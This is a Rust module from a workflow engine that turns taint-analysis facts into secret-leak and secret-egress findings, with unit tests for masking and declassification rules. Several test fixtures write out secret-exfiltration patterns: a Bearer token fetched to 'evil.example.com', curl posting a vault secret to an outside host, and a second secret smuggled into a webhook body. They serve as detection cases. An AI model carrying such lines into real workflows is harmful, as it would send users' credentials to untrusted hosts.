// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! Secret-leak reporting — a thin reader over the IFC flow facts.
//!
//! Per spec `04-variables.md` §secrets · the engine masks its OWN output
//! (logs · traces · journal), but it CANNOT follow a `secrets.X` that the
//! author routes into a subprocess or tool which re-emits it into captured
//! output. The detection is the [`flow`](super::flow) IFC engine (ADR-092);
//! this module turns its taint facts into the two reportable findings ·
//!
//! - [`SecretLeak`] — a secret reaches an `exec`/`invoke` EFFECT (directly,
//!   via a `with:` alias, via a `for_each` item, or transitively through a
//!   tainted upstream output). The full taint chain is carried.
//! - [`SecretEgress`] — a secret reaches the workflow `outputs:` (it leaves
//!   the run as the return value · the literal exfiltration case).
//!
//! `infer`/`agent` PROMPTS are provider-egress sinks (BUG#3 · a secret in a
//! prompt leaves the run to a third-party provider · sanction with `egress:
//! [{ to: "infer" }]` / `{ to: "agent" }`). Their OUTPUT keeps the carve-out
//! (the model response is not a verbatim echo · never taints downstream ·
//! ADR-092 · flow.rs §4).

use super::flow::FlowFacts;
use nika_schema::raw::{RawAction, RawWorkflow};

/// A secret that escapes the masking boundary into an effect.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[non_exhaustive]
pub struct SecretLeak {
    /// The task whose effect can re-emit the secret.
    pub task: String,
    /// The originating secret name (`secrets.<name>`).
    pub secret: String,
    /// The effect surface (`exec` · `invoke`).
    pub sink: &'static str,
    /// The EXACT `egress.to:` value that would sanction this sink — the
    /// tool id for an invoke (`nika:jq`), else the surface (`exec` ·
    /// `infer` · `agent`). Feeds the one-line fix so the flagship IFC
    /// finding is self-serve (use-case battery 2026-07-11 · T2).
    pub sink_id: String,
    /// The full taint chain (`secrets.x → with.t → ...`) for diagnostics.
    pub trace: String,
}

/// The precise `egress.to:` clearance a leak needs: an invoke's tool id
/// (`nika:jq` · `mcp:srv/tool`) is the SPECIFIC sink; every other surface
/// IS its own `to:` token.
fn sink_id_of(action: &RawAction) -> String {
    match action {
        RawAction::Invoke(inv) => match &inv.target {
            nika_schema::raw::RawInvokeTarget::Tool(t) => t.value.clone(),
            // a secret into a child's args egresses to THAT child
            nika_schema::raw::RawInvokeTarget::Workflow(w) => w.value.clone(),
        },
        RawAction::Exec(_) => "exec".to_owned(),
        RawAction::Infer(_) => "infer".to_owned(),
        RawAction::Agent(_) => "agent".to_owned(),
        #[allow(
            clippy::unreachable,
            reason = "non_exhaustive future variant — enum and checker ship together; fail loud beats silently-wrong output"
        )]
        other => unreachable!("unknown action: {other:?}"),
    }
}

/// A secret that leaves the run as a workflow return value.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[non_exhaustive]
pub struct SecretEgress {
    /// The `outputs:` entry name carrying the secret.
    pub output: String,
    /// The originating secret name.
    pub secret: String,
    /// The full taint chain for diagnostics.
    pub trace: String,
}

/// Report every effect-leak from the precomputed flow facts — main verbs
/// AND `on_finally` cleanup verbs (the trace's `on_finally @ <task>` hop
/// distinguishes the cleanup case).
#[must_use]
pub(super) fn scan_leaks(wf: &RawWorkflow, flow: &FlowFacts) -> Vec<SecretLeak> {
    let mut leaks = Vec::new();
    for (idx, task) in wf.tasks.iter().enumerate() {
        // The flow facts are already sanction-filtered (declass · ADR-092):
        // `effect_leak` / `finally_effect_taint` hold only UNSANCTIONED
        // secret→sink edges. A secret whose `egress:` clears this sink does
        // not appear here.
        if let Some(trace) = flow.effect_leak(idx) {
            leaks.push(SecretLeak {
                task: task.value.id.value.clone(),
                secret: trace.secret.clone(),
                sink: match &task.value.action {
                    RawAction::Exec(_) => "exec",
                    RawAction::Invoke(_) => "invoke",
                    // The infer/agent prompt is a provider-egress sink (BUG#3
                    // · a secret in a prompt leaves the run to a third party).
                    RawAction::Infer(_) => "infer",
                    RawAction::Agent(_) => "agent",
                    #[allow(
                        clippy::unreachable,
                        reason = "non_exhaustive future variant — enum and checker ship together; fail loud beats silently-wrong output"
                    )]
                    other => unreachable!("unknown action: {other:?}"),
                },
                sink_id: sink_id_of(&task.value.action),
                trace: trace.render(),
            });
        }
        if let Some((trace, sink, cleanup_idx)) = flow.finally_effect_taint(idx) {
            leaks.push(SecretLeak {
                task: task.value.id.value.clone(),
                secret: trace.secret.clone(),
                sink,
                sink_id: wf
                    .tasks
                    .get(cleanup_idx)
                    .map_or_else(|| sink.to_owned(), |t| sink_id_of(&t.value.action)),
                trace: trace.render(),
            });
        }
    }
    leaks
}

/// Report every workflow-output egress from the precomputed flow facts.
#[must_use]
pub(super) fn scan_egresses(flow: &FlowFacts) -> Vec<SecretEgress> {
    flow.egresses()
        .into_iter()
        .map(|(output, trace)| SecretEgress {
            output: output.to_owned(),
            secret: trace.secret.clone(),
            trace: trace.render(),
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyzer::analyze;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn leaks_of(yaml: &str) -> Vec<SecretLeak> {
        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse");
        let a = analyze(&wf).expect("analyze");
        let flow = super::super::flow::analyze_flow(&wf, &a.topo_waves);
        scan_leaks(&wf, &flow)
    }

    fn egresses_of(yaml: &str) -> Vec<SecretEgress> {
        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse");
        let a = analyze(&wf).expect("analyze");
        let flow = super::super::flow::analyze_flow(&wf, &a.topo_waves);
        scan_egresses(&flow)
    }

    const SECRETS: &str = "\
secrets:
  api_key:
    source: vault
    key: prod/key
";

    #[test]
    fn secret_into_exec_command_leaks() {
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: leak\n{SECRETS}tasks:\n  t:\n    exec: {{ shell: \"curl -H 'Auth: ${{{{ secrets.api_key }}}}' x\" }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert_eq!(l[0].secret, "api_key");
        assert_eq!(l[0].sink, "exec");
    }

    #[test]
    fn secret_into_exec_env_leaks() {
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: leak\n{SECRETS}tasks:\n  t:\n    exec:\n      command: [\"printenv\"]\n      env:\n        TOKEN: \"${{{{ secrets.api_key }}}}\"\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert_eq!(l[0].sink, "exec");
    }

    #[test]
    fn secret_into_invoke_args_leaks() {
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: leak\n{SECRETS}tasks:\n  t:\n    invoke: {{ tool: \"nika:write\", args: {{ path: \"x\", content: \"${{{{ secrets.api_key }}}}\" }} }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert_eq!(l[0].sink, "invoke");
    }

    #[test]
    fn secret_into_infer_prompt_is_a_leak() {
        // BUG#3: a secret in an infer prompt leaves the run to a third-party
        // provider — a leak (sink "infer") unless sanctioned by `to: "infer"`.
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: leak\n{SECRETS}tasks:\n  t:\n    infer: {{ prompt: \"use ${{{{ secrets.api_key }}}}\", max_tokens: 10 }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1, "the provider send is a leak");
        assert_eq!(l[0].secret, "api_key");
        assert_eq!(l[0].sink, "infer");
    }

    #[test]
    fn secret_into_agent_prompt_is_a_leak() {
        // BUG#3: the agent prompt is the same provider-egress sink.
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: leak\n{SECRETS}tasks:\n  t:\n    agent: {{ prompt: \"do ${{{{ secrets.api_key }}}}\", max_turns: 2 }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert_eq!(l[0].sink, "agent");
    }

    #[test]
    fn non_secret_prompt_is_clean() {
        // A prompt with no secret reference is clean (no false positive).
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: ok\n{SECRETS}tasks:\n  t:\n    infer: {{ prompt: \"just text\", max_tokens: 10 }}\n"
        );
        assert!(leaks_of(&yaml).is_empty(), "no secret reference → no leak");
    }

    #[test]
    fn no_secrets_declared_no_scan() {
        let yaml = "nika: v1\nworkflow:\n  id: none\ntasks:\n  t:\n    exec: { command: [\"echo\", \"hi\"] }\n";
        assert!(leaks_of(yaml).is_empty());
    }

    #[test]
    fn with_aliased_secret_now_leaks_with_a_trace() {
        // The review's false negative — fixed by the IFC engine.
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: w\n{SECRETS}tasks:\n  t:\n    with: {{ tok: \"${{{{ secrets.api_key }}}}\" }}\n    exec: {{ shell: \"curl -H ${{{{ with.tok }}}}\" }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert!(l[0].trace.contains("with.tok"), "trace: {}", l[0].trace);
    }

    #[test]
    fn secret_into_on_finally_cleanup_leaks() {
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: w\n{SECRETS}tasks:\n  t:\n    exec: {{ command: [\"echo\", \"build\"] }}\n    on_finally:\n      - invoke: {{ tool: \"nika:write\", args: {{ path: \"x\", content: \"${{{{ secrets.api_key }}}}\" }} }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1, "the cleanup leak is reported");
        assert_eq!(l[0].sink, "invoke");
        assert!(l[0].trace.contains("on_finally"), "trace: {}", l[0].trace);
    }

    #[test]
    fn secret_egress_into_outputs_is_reported() {
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: w\n{SECRETS}tasks:\n  a:\n    exec: {{ shell: \"echo ${{{{ secrets.api_key }}}}\" }}\noutputs:\n  leaked: ${{{{ tasks.a.output }}}}\n"
        );
        let e = egresses_of(&yaml);
        assert_eq!(e.len(), 1);
        assert_eq!(e[0].output, "leaked");
        assert_eq!(e[0].secret, "api_key");
    }

    #[test]
    fn literal_prose_mentioning_secret_is_not_a_leak() {
        // No ${{ }} island → no reference → no leak (the prose false positive).
        let yaml = format!(
            "nika: v1\nworkflow:\n  id: w\n{SECRETS}tasks:\n  t:\n    exec: {{ command: [\"echo\", \"'set\", \"secrets.api_key\", \"in\", \"vault'\"] }}\n"
        );
        assert!(
            leaks_of(&yaml).is_empty(),
            "prose mention is not a reference"
        );
    }
}

/// Sanctioned secret egress (declassification · ADR-092) — the end-to-end
/// contract: a `secrets.X` with an `egress:` clause that clears its sink is
/// no longer a leak, while the laundering shapes stay leaks. Drives the
/// L1∧L2∧L3 composition through the real parse → flow → `scan_leaks` path.
#[cfg(test)]
mod declassification {
    use super::*;
    use crate::analyzer::analyze;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn leaks_of(yaml: &str) -> Vec<SecretLeak> {
        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse");
        let a = analyze(&wf).expect("analyze");
        let flow = super::super::flow::analyze_flow(&wf, &a.topo_waves);
        scan_leaks(&wf, &flow)
    }

    #[test]
    fn sanctioned_fetch_literal_host_is_clean() {
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  stripe:
    source: env
    key: STRIPE_KEY
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
tasks:
  charge:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://api.stripe.com/v1/charges\"
        headers: { Authorization: \"Bearer ${{ secrets.stripe }}\" }
";
        assert!(leaks_of(yaml).is_empty(), "cleared host → clean");
    }

    #[test]
    fn sanctioned_fetch_to_unlisted_host_still_leaks() {
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  stripe:
    source: env
    key: STRIPE_KEY
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
tasks:
  charge:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://evil.example.com/x\"
        headers: { Authorization: \"Bearer ${{ secrets.stripe }}\" }
";
        let l = leaks_of(yaml);
        assert_eq!(l.len(), 1, "a cleared host is not every host");
        assert_eq!(l[0].secret, "stripe");
    }

    #[test]
    fn host_clause_with_derived_destination_still_leaks() {
        // robust declass: the host is templated → not author-fixed.
        let yaml = "\
nika: v1
workflow:
  id: w
const: { ep: \"api.stripe.com\" }
secrets:
  stripe:
    source: env
    key: STRIPE_KEY
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
tasks:
  charge:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://${{ const.ep }}/v1/charges\"
        headers: { Authorization: \"Bearer ${{ secrets.stripe }}\" }
";
        assert_eq!(leaks_of(yaml).len(), 1, "templated host is injectable");
    }

    #[test]
    fn host_from_self_direct_secret_url_is_clean() {
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:notify\"
        host_from_self: true
tasks:
  alert:
    invoke:
      tool: \"nika:notify\"
      args:
        channel: webhook
        target: \"${{ secrets.hook }}\"
        message: \"hi\"
";
        assert!(leaks_of(yaml).is_empty(), "the secret IS the URL → clean");
    }

    #[test]
    fn host_from_self_with_concatenated_url_still_leaks() {
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:notify\"
        host_from_self: true
tasks:
  alert:
    invoke:
      tool: \"nika:notify\"
      args:
        channel: webhook
        target: \"${{ secrets.hook }}/extra/path\"
        message: \"hi\"
";
        assert_eq!(leaks_of(yaml).len(), 1, "concatenation breaks the self-URL");
    }

    #[test]
    fn host_from_self_with_second_secret_in_body_still_leaks() {
        // non-occlusion: a second secret rides out under the trusted URL.
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:notify\"
        host_from_self: true
  apikey:
    source: env
    key: API_KEY
tasks:
  alert:
    invoke:
      tool: \"nika:notify\"
      args:
        channel: webhook
        target: \"${{ secrets.hook }}\"
        message: \"token is ${{ secrets.apikey }}\"
";
        let l = leaks_of(yaml);
        // the occluded second secret is the leak (hook itself is cleared,
        // but the body secret has no egress → it leaks).
        assert!(
            l.iter().any(|x| x.secret == "apikey"),
            "the smuggled secret leaks: {l:?}"
        );
    }

    #[test]
    fn cross_tool_laundering_still_leaks() {
        // egress cleared nika:fetch, but the secret is used in exec.
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"nika:fetch\"
        host: \"api.x.com\"
tasks:
  t:
    exec: { command: [\"curl\", \"-d\", \"${{ secrets.k }}\", \"https://api.x.com\"] }
";
        let l = leaks_of(yaml);
        assert_eq!(l.len(), 1, "fetch clearance never authorizes exec");
        assert_eq!(l[0].sink, "exec");
    }

    #[test]
    fn permits_net_intersection_blocks_egress() {
        // host cleared by egress but absent from permits.net.http (L3).
        let yaml = "\
nika: v1
workflow:
  id: w
permits:
  net: { http: [\"api.anthropic.com\"] }
  tools: [\"nika:fetch\"]
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
tasks:
  t:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://api.stripe.com/v1/x\"
        headers: { Authorization: \"${{ secrets.k }}\" }
";
        assert_eq!(
            leaks_of(yaml).len(),
            1,
            "egress narrows permits · cannot widen"
        );
    }

    #[test]
    fn unsanctioned_secret_into_infer_now_leaks() {
        // BUG#3: a secret into an infer prompt with NO egress is a leak (it
        // leaves the run to a third-party provider · supersedes the prior
        // unconditional carve-out · same class as a secret→mcp: tool).
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  k:
    source: env
    key: K
tasks:
  t:
    infer: { prompt: \"use ${{ secrets.k }}\", max_tokens: 10 }
";
        let l = leaks_of(yaml);
        assert_eq!(l.len(), 1, "an unsanctioned provider send leaks");
        assert_eq!(l[0].sink, "infer");
    }

    #[test]
    fn sanctioned_infer_egress_is_clean() {
        // BUG#3: `to: "infer"` sanctions the prompt send (sink-only rule · no
        // host clause · the provider endpoint is operator-chosen, not a
        // workflow-controlled URL — L2/L3 vacuous, same shape as an `exec`
        // egress). The OUTPUT is never tainted regardless (flow.rs §4).
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"infer\"
tasks:
  t:
    infer: { prompt: \"use ${{ secrets.k }}\", max_tokens: 10 }
";
        assert!(
            leaks_of(yaml).is_empty(),
            "an explicit `to: infer` egress clears the send"
        );
    }

    #[test]
    fn sanctioned_agent_egress_is_clean_but_infer_clearance_does_not_cross() {
        // `to: "agent"` clears the agent send; an `infer`-only clearance does
        // NOT cross to an agent sink (the no-cross-tool-laundering rule).
        let agent_ok = "\
nika: v1
workflow:
  id: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"agent\"
tasks:
  t:
    agent: { prompt: \"do ${{ secrets.k }}\", max_turns: 2 }
";
        assert!(
            leaks_of(agent_ok).is_empty(),
            "`to: agent` clears the agent send"
        );

        let wrong_sink = "\
nika: v1
workflow:
  id: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"infer\"
tasks:
  t:
    agent: { prompt: \"do ${{ secrets.k }}\", max_turns: 2 }
";
        let l = leaks_of(wrong_sink);
        assert_eq!(
            l.len(),
            1,
            "an infer clearance never authorizes an agent send"
        );
        assert_eq!(l[0].sink, "agent");
    }

    #[test]
    fn sanctioned_on_finally_cleanup_is_clean() {
        // the declass clears the cleanup's webhook egress (the war-room shape).
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:notify\"
        host_from_self: true
tasks:
  t:
    exec: { command: [\"echo\", \"done\"] }
    on_finally:
      - invoke:
          tool: \"nika:notify\"
          args:
            channel: webhook
            target: \"${{ secrets.hook }}\"
            message: \"run finished\"
";
        assert!(leaks_of(yaml).is_empty(), "cleared cleanup egress → clean");
    }

    #[test]
    fn unsanctioned_later_cleanup_still_leaks_past_a_sanctioned_one() {
        // soundness: a sanctioned FIRST cleanup must not mask an
        // unsanctioned SECOND one.
        let yaml = "\
nika: v1
workflow:
  id: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:notify\"
        host_from_self: true
  raw:
    source: env
    key: RAW
tasks:
  t:
    exec: { command: [\"echo\", \"done\"] }
    on_finally:
      - invoke:
          tool: \"nika:notify\"
          args: { channel: webhook, target: \"${{ secrets.hook }}\", message: \"ok\" }
      - exec: { command: [\"curl\", \"-d\", \"${{ secrets.raw }}\", \"https://x.com\"] }
";
        let l = leaks_of(yaml);
        assert!(
            l.iter().any(|x| x.secret == "raw" && x.sink == "exec"),
            "the unsanctioned later cleanup leaks: {l:?}"
        );
    }
}
